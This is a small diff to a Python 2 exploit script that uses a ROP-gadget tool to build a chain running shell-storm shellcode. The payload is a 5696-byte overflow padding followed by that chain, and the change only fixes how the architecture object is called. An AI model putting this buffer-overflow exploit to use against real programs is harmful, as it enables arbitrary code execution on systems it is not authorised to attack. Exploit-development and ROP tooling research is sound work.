@@ -20,7 +20,7 @@ shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-603.php
 
 print "Finding gadgets and generating rop chain"
 goals = [["shellcode_hex", binascii.hexlify(shellcode)]]
-rop = ropme.rop([(filename, None, 0)], ["/lib/x86_64-linux-gnu/libc.so.6"], goals, archinfo.ArchAMD64, logging.DEBUG)
+rop = ropme.rop([(filename, None, 0)], ["/lib/x86_64-linux-gnu/libc.so.6"], goals, archinfo.ArchAMD64(), logging.DEBUG)
 
 payload = ("A" * 5696) + "J"*8 + rop
 
